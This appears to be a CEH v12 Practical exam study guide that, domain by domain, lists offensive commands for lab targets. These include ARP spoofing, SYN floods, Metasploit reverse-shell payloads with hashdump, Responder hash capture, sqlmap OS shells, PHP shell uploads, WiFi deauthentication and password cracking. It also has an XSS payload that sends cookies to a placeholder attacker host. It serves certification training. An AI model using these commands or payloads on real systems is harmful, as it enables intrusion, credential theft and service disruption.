CEH v12 - Exam Blueprint

Domain-Based Study Guide

How to Use This Guide

The CEH Practical exam has 20 questions across 9 domains. This guide tells you what to do for each domain: the scenario, the tools to use, the exact steps, and what to look for in the answer. Domains are ordered by weight (heaviest first).

Exam strategy: Read the question carefully. Identify which domain it falls under. Follow the steps below. Save your output files — the exam auto-grades based on submitted flags/answers.

Domain 4 — Network & Perimeter Hacking (25%, 5 questions)

Modules: 08 (Sniffing), 09 (Social Engineering), 10 (DoS), 11 (Session Hijacking), 12 (Evasion)

What to do:

  • Sniffing: Start Wireshark/tshark → capture traffic on the target interface → filter by protocol (http, dns, ftp) → extract credentials, session tokens, or hidden data. Use `tshark -r file.pcap -Y 'http.request' -T fields -e ip.src -e http.host`
  • ARP Poisoning: `arpspoof -i eth0 -t TARGET_IP GATEWAY_IP` → start Wireshark to capture redirected traffic → look for plaintext credentials
  • MAC Flooding: `macof -i eth0` → floods switch CAM table → switch acts as hub → sniff all traffic
  • DoS: `hping3 -S --flood -p 80 TARGET_IP` (SYN flood) → or `slowloris TARGET_IP` for HTTP flood → verify with `netstat` on target
  • Session Hijacking: Capture session cookie from HTTP traffic → inject into browser → access authenticated session. Check for XSS, CSRF, fixation
  • Evasion: Fragment packets with `nmap -f TARGET` → use decoys `-D RND:10` → tunnel traffic through allowed protocols (DNS/HTTP)
  • Social Engineering: SET → Site Cloner → clone target login page → harvest credentials → check Netcraft/PhishTank for phishing detection

Key tools: Wireshark, tshark, arpspoof, macof, hping3, slowloris, SET, Nmap (evasion flags)

What to look for: Captured credentials, session tokens, plaintext HTTP data, MAC table overflow, SYN flood impact, phishing page harvesting results

Domain 2 — Reconnaissance Techniques (15%, 3 questions)

Modules: 02 (Footprinting), 03 (Scanning), 04 (Enumeration)

What to do:

  • Footprinting: Google dorking (`site:target.com filetype:pdf`, `intitle:login site:target.com`) → theHarvester (`theHarvester -d target.com -l 500 -b google,bing,linkedin`) → WHOIS/DNS lookup → Netcraft/Shodan/Censys for OS fingerprinting
  • Scanning: `nmap -sn -PR 10.10.1.0/24` (host discovery) → `nmap -sS -sV -O -A TARGET` (port/service/OS detection) → `nmap -sU TARGET` (UDP) → save output with `-oN scan.txt`
  • Enumeration: `enum4linux -a TARGET` (SMB full enum) → `snmpwalk -v1 -c public TARGET` (SNMP) → `dig @ns1.target.com target.com axfr` (DNS zone transfer) → `ldapsearch -x -h TARGET -b "dc=domain,dc=com"` (LDAP) → `smtp-user-enum -M VRFY -U users.txt -t TARGET` (SMTP)
  • Key Nmap NSE: `nmap --script smb-enum-shares,smb-enum-users TARGET`, `nmap --script dns-brute TARGET`, `nmap --script http-enum TARGET`

Key tools: Nmap, theHarvester, dig, nslookup, enum4linux, snmpwalk, ldapsearch, smtp-user-enum, Shodan, Censys, Netcraft

What to look for: Open ports, service versions, OS fingerprint, usernames, shares, DNS records, SNMP community strings, zone transfer data

Domain 3 — System Hacking Phases & Attack Techniques (15%, 3 questions)

Modules: 05 (Vulnerability Analysis), 06 (System Hacking), 07 (Malware Threats)

What to do:

  • Vulnerability Research: Search CVE databases (NVD, CVE.org) for target software version → check CVSS score → identify exploit availability on Exploit-DB
  • Vulnerability Scanning: OpenVAS: `openvas-start` → create target → run full scan → export report. Nessus: create scan policy → launch → review findings. Nikto: `nikto -h http://TARGET`
  • System Hacking (Responder): `sudo responder -I eth0` → on Windows target, access `\\CEH-Tools` → capture NTLM hash → crack with `john hash.txt` or `hashcat -m 5600 hash.txt rockyou.txt`
  • Metasploit: `msfconsole` → `search exploit_name` → `use exploit/path` → `set RHOSTS TARGET` → `set LHOST ATTACKER` → `set payload windows/meterpreter/reverse_tcp` → `exploit` → `getsystem` → `hashdump` → `migrate` to stable process
  • Privilege Escalation: `sudo -l` (Linux) → check SUID binaries `find / -perm -4000` → linpeas.sh → Windows: `whoami /priv` → check UAC → `bypassuac_fodhelper` → `getsystem`
  • Malware Analysis: Static: `file sample.exe` → `strings sample.exe` → `readelf -h sample` (Linux ELF) → check PE headers. Dynamic: run in sandbox → monitor network/file/registry changes → VirusTotal scan
  • Steganography: `steghide info image.jpg` → `steghide extract -sf image.jpg -p password` → `stegseek image.jpg rockyou.txt` → `strings image.jpg | grep -i flag`

Key tools: OpenVAS, Nessus, Nikto, Metasploit, Responder, John, Hashcat, msfvenom, linpeas, PEview, VirusTotal, steghide, stegseek

What to look for: CVE IDs, CVSS scores, captured NTLM hashes, Meterpreter sessions, privilege escalation success, hidden data in images, malware behavior indicators

Domain 5 — Web Application Hacking (15%, 3 questions)

Modules: 13 (Web Servers), 14 (Web Applications), 15 (SQL Injection)

What to do:

  • Web Server Footprinting: `nmap -sV -sC TARGET` → banner grab with `telnet TARGET 80` → `GET / HTTP/1.0` → check Server header, X-Powered-By, cookies
  • Directory Enumeration: `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` → `dirb http://TARGET` → `nikto -h http://TARGET`
  • Web App Scanning: OWASP ZAP → Automated Scan → Spider + Active Scan → review alerts. Burp Suite → intercept → modify requests → test for XSS, CSRF, IDOR, command injection
  • SQL Injection: Test input fields with `' or 1=1 --` → if vulnerable, use sqlmap: `sqlmap -u 'http://TARGET/page?id=1' --dbs` → `-D dbname --tables` → `-D dbname -T table --dump` → `--os-shell` for command execution
  • XSS: Inject <script>alert('XSS')</script> in input fields → check if reflected/stored → steal cookies with <script>document.location='http://ATTACKER/?c='+document.cookie</script>
  • File Upload: Upload PHP shell → bypass extension filters (.php5, .phtml) → access uploaded file → get reverse shell
  • Authentication Bypass: SQLi tautology, default credentials, brute force with Hydra: `hydra -l admin -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'`

Key tools: Nmap, Gobuster, Dirb, Nikto, OWASP ZAP, Burp Suite, sqlmap, Hydra, WhatWeb, Skipfish

What to look for: Hidden directories, SQLi-vulnerable parameters, XSS injection points, file upload bypasses, admin credentials, database dumps, OS command execution

Domain 7 — Mobile, IoT & OT Hacking (10%, 2 questions)

Modules: 17 (Mobile), 18 (IoT/OT)

What to do:

  • Android: `adb devices` → `adb shell` → extract APK with `apktool d app.apk` → analyze with JADX → check for hardcoded credentials, insecure storage, debuggable flag
  • IoT/MQTT: `nmap -sV -p 1883 TARGET` (MQTT) → `mosquitto_sub -h TARGET -t '#'` (subscribe all topics) → `mosquitto_pub -h TARGET -t 'topic' -m 'payload'` (publish) → analyze MQTT traffic in Wireshark
  • OT/SCADA: Identify Modbus (port 502), DNP3 (port 20000) → use Nmap NSE scripts → capture protocol traffic → analyze for default credentials

Key tools: ADB, apktool, JADX, mosquitto_sub/pub, Nmap, Wireshark

What to look for: Hardcoded API keys, insecure data storage, MQTT topic data, default OT credentials, exposed IoT services

Domain 6 — Tools/Systems/Programs (5%, 1 question)

Module: 16 (Wireless)

What to do:

  • Monitor Mode: `airmon-ng start wlan0` → `airodump-ng wlan0mon` (scan for networks)
  • Capture Handshake: `airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon` → `aireplay-ng -0 5 -a BSSID wlan0mon` (deauth to force handshake)
  • Crack: `aircrack-ng -w rockyou.txt capture*.cap` (WPA/WPA2) → `airdecap-ng` to decrypt capture
  • WEP: `aireplay-ng -3 -b BSSID wlan0mon` (ARP replay) → collect IVs → `aircrack-ng -b BSSID capture*.cap`

Key tools: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, airdecap-ng

What to look for: WPA handshake capture, cracked WiFi password, decrypted traffic

Domain 8 — Cloud Computing (5%, 1 question)

Module: 19 (Cloud)

What to do:

  • S3 Enumeration: `aws s3 ls s3://bucket-name --no-sign-request` → check for public buckets → download files with `aws s3 cp s3://bucket/file . --no-sign-request`
  • Cloud Recon: Search for exposed S3 buckets, Azure blobs, GCP storage → check IAM misconfigurations → look for hardcoded credentials in code repos
  • Tools: AWS CLI, S3Scanner, cloud_enum, ScoutSuite

What to look for: Public S3 buckets, exposed cloud storage, leaked credentials, misconfigured IAM policies

Domain 9 — Cryptography (5%, 1 question)

Module: 20 (Cryptography)

What to do:

  • Hash Identification: `hash-identifier` → identify hash type → crack with John/Hashcat
  • John: `john --format=raw-md5 --wordlist=rockyou.txt hash.txt` → `john --show hash.txt`
  • Hashcat: `hashcat -m 0 -a 0 hash.txt rockyou.txt` (MD5) → `hashcat -m 1000 ntlm.txt rockyou.txt` (NTLM) → `hashcat -m 0 hash.txt --show`
  • Encryption: Identify cipher type → use CyberChef for decoding → check for weak keys, ECB mode, padding oracle

Key tools: John the Ripper, Hashcat, CyberChef, hash-identifier, OpenSSL

What to look for: Hash type, cracked password, decrypted data, weak encryption implementation

Domain 1 — Information Security & Ethical Hacking (5%, 1 question)

Module: 01 (Introduction)

What to do:

  • Conceptual question — usually about ethical hacking phases, security concepts, or terminology
  • Review: CIA triad, hacking phases (reconnaissance → scanning → gaining access → maintaining access → covering tracks), types of hackers, security frameworks
  • No hands-on tools typically needed — read the question and select the correct answer

What to look for: Definition-based answers, phase identification, terminology matching
